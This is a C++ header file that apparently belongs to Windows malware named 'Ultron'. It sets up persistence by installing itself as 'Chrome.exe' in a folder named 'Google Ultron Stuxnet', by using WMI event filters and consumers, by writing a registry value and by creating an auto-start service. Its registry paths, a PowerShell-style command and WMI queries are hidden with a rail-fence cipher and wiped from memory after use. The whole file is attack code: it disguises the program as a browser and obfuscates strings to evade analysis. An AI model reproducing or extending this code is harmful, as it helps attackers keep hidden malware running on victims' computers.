#pragma once
#include "Cipher.hpp"

/* -----------------------------------------------------------------------------------*/
/*        WMI Persistence                                                             */

// Install locations
#define INSTALL_APPDATA TRUE // Install to appdata if we can't get admin privileges
#define INSTALL_SYSROOT FALSE // Install to system root if we can get admin privileges
std::wstring INSTALL_FOLDER = L"Google Ultron Stuxnet"; // Folder name
std::wstring INSTALL_FILENAME = L"Chrome.exe"; // Filename

// WMI Registry Persistence
#define WMI_REGISTRY_ENABLED TRUE // Enabled
#define WMI_HIVE_LONG (LONG)HKEY_LOCAL_MACHINE // Hive
std::wstring WMI_REGISTRY_HIVE = L"HANKCLIEEO_HYLMC_A"; // HKEY_LOCAL_MACHINE
std::wstring WMI_REGISTRY_VALUENAME = L"Ultrno"; // Value name
std::wstring WMI_FILTER_NAME = L"UltronFilter"; // Filter name
std::wstring WMI_CONSUMER_NAME = L"UltronConsumer"; // Consumer name

// WMI Script Persistence
#define WMI_SCRIPT_ENABLED TRUE
std::wstring WMI_REGISTRY_KEY = L"S\\odrsnOE\\sfnourriuFRMotiwCeeoRTAir\\Ws\\nVn\\Wc\\\\t\\"; // Key
std::wstring SCRIPT_DECIPHER_1 = L"plCSP oel-o emryHwh. mdteotKeseemn-tprL:rxaIeM";
std::wstring SCRIPT_DECIPHER_2 = WMI_REGISTRY_KEY;
std::wstring SCRIPT_DECIPHER_3 = L" -N aem";
std::wstring SCRIPT_DECIPHER_4 = WMI_REGISTRY_VALUENAME;
std::wstring SCRIPT_DECIPHER_5 = L" - Veaul";

// WMI Service Persistence
#define SERVICE_ENABLED TRUE // Enabled
#define SERVICE_NAME L"Ultron" // Service name
#define SERVICE_DISPLAYNAME L"Ultron" // Service display name
#define SERVICE_DESCRIPTION L"Ultron" // Service description
#define SERVICE_STARTUP_TYPE SERVICE_AUTO_START // Service startup type
#define SERVICE_DEPENDENCIES L"" // Service dependencies

class StringTable
{
public:
	/*
	StringTable()
	{
		// Decipher everything on initialization

		ciph.decipher(5, WMI_REGISTRY_KEY, keypath);
		ciph.decipher(5, WMI_REGISTRY_VALUENAME, wmi_registry_valuename);
		ciph.decipher(5, WMI_REGISTRY_HIVE, wmi_registry_hive);
		ciph.decipher(5, WMI_REGISTRY_KEY, wmi_registry_key);
		ciph.decipher(5, SCRIPT_DECIPHER_1, script_1);
		ciph.decipher(5, SCRIPT_DECIPHER_2, script_2);
		ciph.decipher(5, SCRIPT_DECIPHER_3, script_3);
		ciph.decipher(5, SCRIPT_DECIPHER_4, script_4);
		ciph.decipher(5, SCRIPT_DECIPHER_5, script_5);
		script = script_1 + script_2 + script_3 + script_4 + script_5;

		std::wstring sFilterQuery_1 = L"S gleHeE*FeiaugEWEv=L RRsVenv Ri'ETO tyCaetEHCMrhn ";
		std::wstring sFilterQuery_2 = L"'yO\\sW\\nn\\Da ePSF\\\\oo\\i\\\\eto\\n\\N NmAKa'TE\\rf\\ns\\rVi\\u\\AVeeN t=WRMct\\dwCres\\R\\ au 'DhAi\\our\\'l=";
		std::wstring filterquery_1;
		std::wstring filterquery_2;

		ciph.decipher(5, sFilterQuery_1, filterquery_1);
		ciph.decipher(5, sFilterQuery_2, filterquery_2);

		sFilterQuery = filterquery_1 + wmi_registry_hive + filterquery_2 + wmi_registry_valuename + L"'";
	}
	*/
	std::wstring GetKeypath()
	{
		ciph.decipher(5, WMI_REGISTRY_KEY, keypath);
		return keypath;
	}
	void DestroyKeypath()
	{
		SecureZeroMemory(&keypath[0], keypath.size() * sizeof(wchar_t));
	}

	std::wstring GetRegistryValueName()
	{
		ciph.decipher(5, WMI_REGISTRY_VALUENAME, wmi_registry_valuename);
		return wmi_registry_valuename;
	}
	void DestroyRegistryValueName()
	{
		SecureZeroMemory(&wmi_registry_valuename[0], wmi_registry_valuename.size() * sizeof(wchar_t));
	}
	
	std::wstring GetRegistryHive()
	{
		ciph.decipher(5, WMI_REGISTRY_HIVE, wmi_registry_hive);
		return wmi_registry_hive;
	}
	void DestroyRegistryHive()
	{
		SecureZeroMemory(&wmi_registry_hive[0], wmi_registry_hive.size() * sizeof(wchar_t));
	}

	std::wstring GetRegistryKey()
	{
		ciph.decipher(5, WMI_REGISTRY_KEY, wmi_registry_key);
		return wmi_registry_key;
	}
	void DestroyRegistryKey()
	{
		SecureZeroMemory(&wmi_registry_key[0], wmi_registry_key.size() * sizeof(wchar_t));
	}
	
	std::wstring GetScript()
	{
		ciph.decipher(5, SCRIPT_DECIPHER_1, script_1);
		ciph.decipher(5, SCRIPT_DECIPHER_2, script_2);
		ciph.decipher(5, SCRIPT_DECIPHER_3, script_3);
		ciph.decipher(5, SCRIPT_DECIPHER_4, script_4);
		ciph.decipher(5, SCRIPT_DECIPHER_5, script_5);
		script = script_1 + script_2 + script_3 + script_4 + script_5;
		return script;
	}
	void DestroyScript()
	{
		SecureZeroMemory(&script_1[0], script_1.size() * sizeof(wchar_t));
		SecureZeroMemory(&script_2[0], script_2.size() * sizeof(wchar_t));
		SecureZeroMemory(&script_3[0], script_3.size() * sizeof(wchar_t));
		SecureZeroMemory(&script_4[0], script_4.size() * sizeof(wchar_t));
		SecureZeroMemory(&script_5[0], script_5.size() * sizeof(wchar_t));
		SecureZeroMemory(&script[0], script.size() * sizeof(wchar_t));
	}
	
	std::wstring GetFilterQuery()
	{
		std::wstring sFilterQuery_1 = L"S gleHeE*FeiaugEWEv=L RRsVenv Ri'ETO tyCaetEHCMrhn ";
		std::wstring sFilterQuery_2 = L"'yO\\sW\\nn\\Da ePSF\\\\oo\\i\\\\eto\\n\\N NmAKa'TE\\rf\\ns\\rVi\\u\\AVeeN t=WRMct\\dwCres\\R\\ au 'DhAi\\our\\'l=";
		std::wstring filterquery_1;
		std::wstring filterquery_2;

		ciph.decipher(5, sFilterQuery_1, filterquery_1);
		ciph.decipher(5, sFilterQuery_2, filterquery_2);

		sFilterQuery = filterquery_1 + GetRegistryHive() + filterquery_2 + GetRegistryValueName() + L"'";
		
		return sFilterQuery;
	}
	void DestroyFilterQuery()
	{
		SecureZeroMemory(&sFilterQuery[0], sFilterQuery.size() * sizeof(wchar_t));
		SecureZeroMemory(&filterquery_1[0], filterquery_1.size() * sizeof(wchar_t));
		SecureZeroMemory(&filterquery_2[0], filterquery_2.size() * sizeof(wchar_t));
	}
	
	~StringTable()
	{
		// Destroy all the strings
		DestroyKeypath();
		DestroyRegistryValueName();
		DestroyRegistryHive();
		DestroyRegistryKey();
		DestroyScript();
		DestroyFilterQuery();
	}
	
	// Definitions
std::wstring keypath;
std::wstring wmi_registry_hive;
std::wstring wmi_registry_key;
std::wstring wmi_registry_valuename;
std::wstring script_1;
std::wstring script_2;
std::wstring script_3;
std::wstring script_4;
std::wstring script_5;
std::wstring script;
std::wstring filterquery_1;
std::wstring filterquery_2;
std::wstring sFilterQuery;
Railfence ciph;

};